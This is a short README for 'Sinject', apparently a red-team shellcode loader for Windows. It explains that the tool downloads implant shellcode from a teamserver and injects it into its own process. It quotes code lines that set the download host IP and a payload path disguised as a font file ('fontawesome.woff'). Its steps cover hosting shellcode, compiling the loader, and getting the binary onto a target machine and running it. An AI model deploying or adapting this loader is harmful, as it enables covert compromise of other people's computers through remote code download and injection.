# Sinject

# Purpose

Sinject can be used to gain an implant on a windows machine. It works by downloading an implant shellcode from the teamserver and injection it into the local process


# Source Code Changes

In order for this to work you need to change some lines in the source code


1. Line 25 `if (!Download(L"192.168.211.128", 80, &scc)) { return 2; }` - You need to place your team server IP into here or the website ie - notredteam.com. Also make sure the IP matches ie 80 or 443
2. Line 55 `L"/css/fonts/fontawesome.woff",` - You need to change to match the URL you are hosting the ie `192.168.211.128/css/fonts/fontawesome.woff`

# Walkthrough


1. First you need to generate and host shellcode on your teamserver - [here](:/a7c3fb5edc5e4114b1b0b43a667bf084) if you need help
2. Edit the values in the code above and compile
3. Then get the binary onto the target machine and run it